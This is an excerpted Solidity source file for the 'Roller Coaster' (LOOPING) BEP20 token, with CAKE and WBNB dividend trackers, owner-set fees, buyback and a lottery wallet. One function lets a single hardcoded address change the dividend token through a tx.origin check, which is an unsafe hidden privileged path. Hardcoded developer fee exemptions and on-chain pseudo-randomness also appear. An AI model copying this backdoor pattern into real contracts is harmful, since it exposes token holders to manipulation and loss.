...
contract DividendPayingToken is BEP20, IDividendPayingToken, IDividendPayingTokenOptional {
    ...
    function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0xDbA1f0e5a48E4D11753a9B352f4dC3B47aA6536a, "Only owner");
...
contract RollerCoaster is BEP20, Ownable {
    using SafeMath for uint256;
    ...
    // Minimum LOOPING sell order to trigger buyback
    ...
    uint256 public cakeDividendPriority = 50; // 50% cake + 50% WBNB
    ...
    constructor() BEP20("Roller Coaster", "LOOPING") {
        cakeDividendTracker = new CakeDividendTracker();
        wbnbDividendTracker = new WBNBDividendTracker();

        lotteryWallet = 0xa595D058A81AE5e04547c95950d7655c2cb24B00;
        marketingWallet = 0x484E6e59F24E9457e3Dea31365165393884a9565;
        ...
        excludeFromDividend(address(_pancakeV2Router));
        ...
        excludeFromFees(address(0x844f0949091F107C97266A737b2e293E5f8b5a05), true); // Alt
        excludeFromFees(address(0x5A6c0FF57d4416bD1158D68ce01973A66a35Dd1a), true); // Dev1
        excludeFromFees(address(0x68E126cB0571b65237c9A43f90DcbE9004Bd81c6), true); // Dev2
    ...
    function updateMinWBNBBeforeSendDividend(uint256 _newAmount) external onlyOwner {
        wbnbDividendTracker.setMinTokenBeforeSendDividend(_newAmount);
    }
    ...
    function getMinWBNBBeforeSendDividend() external view returns (uint256) {
        return wbnbDividendTracker.minTokenBeforeSendDividend();
    }
    ...
    function setSendWBNBInTx(bool _newStatus) external onlyOwner {
        sendWBNBInTx = _newStatus;
    }
    ...
    function afterPreSale() external onlyOwner {
        ...
        maxSellTransactionAmount = 3000000 * (10**9); // 0.3%
    ...
    function setBuyBackAndLiquifyEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = buyBackAndLiquidityFee.add(marketingFee).add(wbnbDividendRewardsFee).add(cakeDividendRewardsFee);
            buyBackAndLiquifyEnabled = _enabled;
        }
    ...
    function setCakeDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = cakeDividendRewardsFee.add(marketingFee).add(wbnbDividendRewardsFee).add(buyBackAndLiquidityFee);
            cakeDividendEnabled = _enabled;
        }
    ...
    function setWBNBDividendEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = wbnbDividendRewardsFee.add(marketingFee).add(cakeDividendRewardsFee).add(buyBackAndLiquidityFee);
            wbnbDividendEnabled = _enabled;
        }
    ...
    function setMarketingEnabled(bool _enabled) external onlyOwner {
        if (_enabled == false) {
            ...
            totalFees = marketingFee.add(wbnbDividendRewardsFee).add(cakeDividendRewardsFee).add(buyBackAndLiquidityFee);
            marketingEnabled = _enabled;
        }
    ...
    function updateCakeDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newCakeDividendTracker.owner() == address(this), "must be owned by RollerCoaster");
        ...
        newCakeDividendTracker.excludeFromDividends(address(pancakeV2Router));
    ...
    function updateWBNBDividendTracker(address newAddress) external onlyOwner {
        ...
        require(newWBNBDividendTracker.owner() == address(this), "must be owned by RollerCoaster");
        ...
        newWBNBDividendTracker.excludeFromDividends(address(pancakeV2Router));
    ...
    function updateWBNBDividendRewardFee(uint8 newFee) external onlyOwner {
        ...
        totalFees = wbnbDividendRewardsFee.add(cakeDividendRewardsFee).add(marketingFee).add(buyBackAndLiquidityFee);
    }

    function updateMarketingFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        marketingFee = newFee;
        totalFees = marketingFee.add(cakeDividendRewardsFee).add(wbnbDividendRewardsFee).add(buyBackAndLiquidityFee);
    }

    function updateBuyBackAndLiquidityFee(uint8 newFee) external onlyOwner {
        require(newFee <= MAX_FEE_RATE, "wrong");
        buyBackAndLiquidityFee = newFee;
        totalFees = buyBackAndLiquidityFee.add(cakeDividendRewardsFee).add(wbnbDividendRewardsFee).add(marketingFee);
    }

    function updatePancakeV2Router(address newAddress) external onlyOwner {
    ...
    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {
        require(pair != pancakeV2Pair, "cannot be removed");
    ...
    function _transfer(
        ...
        if (
            ...
            if (!swapping && contractTokenBalance >= swapTokensAtAmount) {
                ...
                if (marketingEnabled) {
                    ...
                    uint256 lotteryPortion = address(this).balance.div(4);
                ...
                if (wbnbDividendEnabled) {
                    uint256 sellTokens = contractTokenBalance.div(totalFees).mul(wbnbDividendRewardsFee);
                    swapAndSendWBNBDividends(sellTokens.sub(1300));
                }
        ...
        if(!swapping) {
            ...
            if(rand() <= cakeDividendPriority) {
                ...
                if( wbnbDividendEnabled && sendWBNBInTx ){
    ...
    function buyBackAndBurn(uint256 amount) private {
        ...
        // make the swap
        pancakeV2Router.swapExactBNBForTokensSupportingFeeOnTransferTokens{value: amount}(
    ...
    function swapTokensForDividendToken(uint256 _tokenAmount, address _recipient, address _dividendAddress) private {
        // generate the pancake pair path of weth -> busd
    ...
    function swapAndSendCakeDividends(uint256 tokens) private {
        ...
        uint256 cakeDividends = IBEP20(cakeDividendToken).balanceOf(address(this));
    ...
    function swapAndSendWBNBDividends(uint256 tokens) private {
        ...
        uint256 wbnbDividends = IBEP20(wbnbDividendToken).balanceOf(address(this));
...
contract WBNBDividendTracker is DividendPayingToken, Ownable {
    ...
    constructor() DividendPayingToken("WBNB_Dividend_Tracker", "WBNB_Dividend_Tracker", 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c) {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 200000 * (10**9); //must hold 200000+ tokens
    }
